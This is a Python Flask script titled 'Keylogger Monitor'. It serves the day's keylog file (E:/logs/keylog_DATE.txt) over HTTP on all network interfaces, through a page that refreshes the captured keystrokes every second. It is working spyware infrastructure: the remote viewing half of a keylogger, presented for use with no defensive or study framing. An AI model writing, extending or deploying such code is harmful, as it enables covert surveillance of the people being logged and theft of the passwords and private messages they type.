from flask import Flask, send_file
import os
from datetime import datetime

app = Flask(__name__)

def get_latest_log():
    try:
        # Get current day's log file
        current_date = datetime.now().strftime("%Y%m%d")
        log_file = f"E:/logs/keylog_{current_date}.txt"
        
        if os.path.exists(log_file):
            with open(log_file, 'r', encoding='utf-8') as f:
                return f.read()
        return "No logs found for today"
    except Exception as e:
        print(f"Error reading log: {e}")
        return "Error reading log file"

@app.route('/logs')
def get_logs():
    return get_latest_log()

@app.route('/')
def home():
    return '''
    <html>
        <head>
            <title>Keylogger Monitor</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }
                body {
                    font-family: monospace;
                    background: #000;
                    color: #0f0;
                    line-height: 1.4;
                    padding: 10px;
                    font-size: 14px;
                }
                #log-container {
                    white-space: pre-wrap;
                    word-wrap: break-word;
                }
            </style>
        </head>
        <body>
            <div id="log-container"></div>
            <script>
                function updateLogs() {
                    fetch('/logs?' + new Date().getTime())
                        .then(response => response.text())
                        .then(text => {
                            document.getElementById('log-container').textContent = text;
                        })
                        .catch(console.error);
                }
                
                // Update every second
                setInterval(updateLogs, 1000);
                
                // Initial update
                updateLogs();
                
                // Auto-scroll to bottom when new content arrives
                const container = document.getElementById('log-container');
                const observer = new MutationObserver(() => {
                    container.scrollTop = container.scrollHeight;
                });
                
                observer.observe(container, {
                    childList: true,
                    characterData: true,
                    subtree: true
                });
            </script>
        </body>
    </html>
    '''

if __name__ == '__main__':
    print("Starting keylogger monitor at http://localhost:5001")
    app.run(host='0.0.0.0', port=5001)